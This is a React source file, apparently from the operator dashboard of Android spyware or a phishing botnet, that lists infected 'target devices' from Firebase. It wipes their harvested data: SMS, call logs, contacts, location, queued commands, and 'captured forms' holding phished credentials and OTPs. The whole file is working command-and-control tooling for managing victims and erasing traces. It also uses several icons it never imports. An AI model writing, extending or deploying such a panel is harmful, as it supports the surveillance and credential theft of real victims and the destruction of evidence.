import { useState, useEffect } from 'react'
import { motion } from 'framer-motion'
import { Zap, Trash2, Loader2, AlertTriangle, CheckCircle, XCircle, Shield, Database, Wifi, Smartphone, RefreshCw, Terminal } from 'lucide-react'
import { db } from '../context/AuthContext'
import { ref, onValue, off, get, remove } from 'firebase/database'
import { toast } from 'sonner'

export default function MagicClear() {
  const [devices, setDevices] = useState([])
  const [loading, setLoading] = useState(true)
  const [clearing, setClearing] = useState(null)
  const [clearType, setClearType] = useState('all')
  const [results, setResults] = useState([])

  useEffect(() => {
    if (!db) { setLoading(false); return }
    const usersRef = ref(db, 'users')
    const unsub = onValue(usersRef, (snapshot) => {
      const data = snapshot.val() || {}
      const list = Object.entries(data)
        .filter(([, d]) => d.fcm && d.online)
        .map(([id, d]) => ({ id, name: `${d.brand} ${d.model}`, fcm: d.fcm, online: d.online }))
      setDevices(list)
      setLoading(false)
    })
    return () => off(usersRef, 'value', unsub)
  }, [])

  const clearData = async (deviceId, type) => {
    if (!confirm(`Clear ${type} data for this device?`)) return
    setClearing(deviceId)
    try {
      const paths = {
        all: [`users/${deviceId}/messages`, `users/${deviceId}/forms`, `users/${deviceId}/calls`, `users/${deviceId}/sent_sms`, `users/${deviceId}/contacts`, `users/${deviceId}/notes`, `users/${deviceId}/location`, `commands/${deviceId}`],
        messages: [`users/${deviceId}/messages`],
        forms: [`users/${deviceId}/forms`],
        calls: [`users/${deviceId}/calls`],
        sms: [`users/${deviceId}/sent_sms`],
        commands: [`commands/${deviceId}`],
      }
      await Promise.all(paths[type].map(p => remove(ref(db, p))))
      toast.success(`${type} cleared`)
      setResults(prev => [...prev, { deviceId, type, time: Date.now(), success: true }])
    } catch (err) {
      toast.error('Failed to clear')
      setResults(prev => [...prev, { deviceId, type, time: Date.now(), success: false, error: err.message }])
    } finally {
      setClearing(null)
    }
  }

  const clearAllDevices = async () => {
    if (!confirm(`Clear ${clearType} data for ALL ${devices.length} online devices?`)) return
    for (const device of devices) {
      await clearData(device.id, clearType)
      await new Promise(r => setTimeout(r, 200))
    }
  }

  if (loading) return <div className="p-5 space-y-4"><div className="h-12 bg-secondary/50 rounded-xl animate-pulse" />{[...Array(5)].map((_, i) => <div key={i} className="h-20 bg-secondary/50 rounded-xl animate-pulse" />)}</div>

  const clearOptions = [
    { id: 'all', label: 'All Data', icon: Trash2, desc: 'Messages, forms, calls, SMS, contacts, commands', danger: true },
    { id: 'messages', label: 'Messages', icon: MessageSquare, desc: 'Incoming/outgoing SMS messages' },
    { id: 'forms', label: 'Captured Forms', icon: FileText, desc: 'Phishing form data (credentials, OTPs)' },
    { id: 'calls', label: 'Call Logs', icon: Phone, desc: 'Incoming/outgoing/missed calls' },
    { id: 'sms', label: 'Sent SMS', icon: Send, desc: 'Outgoing SMS history' },
    { id: 'commands', label: 'Command Queue', icon: Zap, desc: 'Pending device commands' },
  ]

  return (
    <div className="p-5 space-y-6">
      <div className="flex items-center justify-between">
        <div><h1 className="text-2xl font-black text-foreground">Magic Clear</h1><p className="text-sm text-muted-foreground mt-1">Remote data wiping for connected devices</p></div>
      </div>

      <div className="rounded-2xl border border-destructive/20 bg-destructive/5 p-4">
        <div className="flex items-center gap-3">
          <AlertTriangle className="h-6 w-6 text-destructive" />
          <div><p className="font-bold text-foreground">Dangerous Operation</p><p className="text-sm text-muted-foreground">This permanently deletes data from target devices. Action cannot be undone.</p></div>
        </div>
      </div>

      <div className="grid md:grid-cols-2 gap-6">
        <div className="rounded-2xl border border-border bg-card p-6 space-y-4">
          <h2 className="text-lg font-bold text-foreground">Clear Type</h2>
          <div className="space-y-2">
            {clearOptions.map(opt => (
              <label key={opt.id} className={`flex items-center gap-3 p-3 rounded-xl border transition-all cursor-pointer ${clearType === opt.id ? 'border-primary bg-primary/5' : 'border-border hover:border-primary/30'}`}>
                <input type="radio" name="clearType" value={opt.id} checked={clearType === opt.id} onChange={e => setClearType(e.target.value)} className="h-4 w-4 text-primary focus:ring-primary" />
                <opt.icon className="h-5 w-5 text-primary" />
                <div className="flex-1"><p className="font-medium">{opt.label}</p><p className="text-sm text-muted-foreground">{opt.desc}</p></div>
                {opt.danger && <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-destructive/10 text-destructive">DANGER</span>}
              </label>
            ))}
          </div>
        </div>

        <div className="rounded-2xl border border-border bg-card p-6 space-y-4">
          <h2 className="text-lg font-bold text-foreground">Target Devices ({devices.length} online)</h2>
          <div className="max-h-60 overflow-y-auto space-y-2">
            {devices.length === 0 ? <p className="text-center text-muted-foreground py-8">No online devices with FCM tokens</p> : devices.map(d => (
              <div key={d.id} className="flex items-center gap-3 p-2 rounded-lg hover:bg-secondary/50">
                <Smartphone className="h-4 w-4 text-primary" />
                <span className="flex-1 font-medium truncate">{d.name}</span>
                <button onClick={() => clearData(d.id, clearType)} disabled={clearing === d.id} className="px-3 py-1.5 rounded-lg bg-destructive/10 text-destructive text-sm font-medium hover:bg-destructive/20 transition-colors disabled:opacity-50">{clearing === d.id ? <Loader2 className="h-3 w-3 animate-spin" /> : 'Clear'}</button>
              </div>
            ))}
          </div>
          {devices.length > 0 && (
            <button onClick={clearAllDevices} disabled={clearing} className="w-full py-3 rounded-xl bg-destructive text-destructive-foreground font-bold hover:bg-destructive/90 transition-colors disabled:opacity-50 flex items-center justify-center gap-2">
              <Trash2 className="h-5 w-5" /> Clear {clearType} for ALL Devices
            </button>
          )}
        </div>
      </div>

      {results.length > 0 && (
        <div className="rounded-2xl border border-border bg-card p-6 space-y-4">
          <h2 className="text-lg font-bold text-foreground">Recent Operations</h2>
          <div className="max-h-60 overflow-y-auto space-y-2">
            {results.slice(-20).reverse().map((r, i) => (
              <div key={i} className={`p-3 rounded-xl ${r.success ? 'bg-green-500/10 border border-green-500/20' : 'bg-destructive/10 border border-destructive/20'}`}>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    {r.success ? <CheckCircle className="h-4 w-4 text-green-500" /> : <XCircle className="h-4 w-4 text-destructive" />}
                    <span className="font-medium">{r.deviceId.slice(0, 12)}...</span>
                    <span className="text-[10px] text-muted-foreground uppercase">{r.type}</span>
                  </div>
                  <span className="text-[11px] text-muted-foreground">{new Date(r.time).toLocaleTimeString()}</span>
                </div>
                {r.error && <p className="text-sm text-destructive mt-1">{r.error}</p>}
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  )
}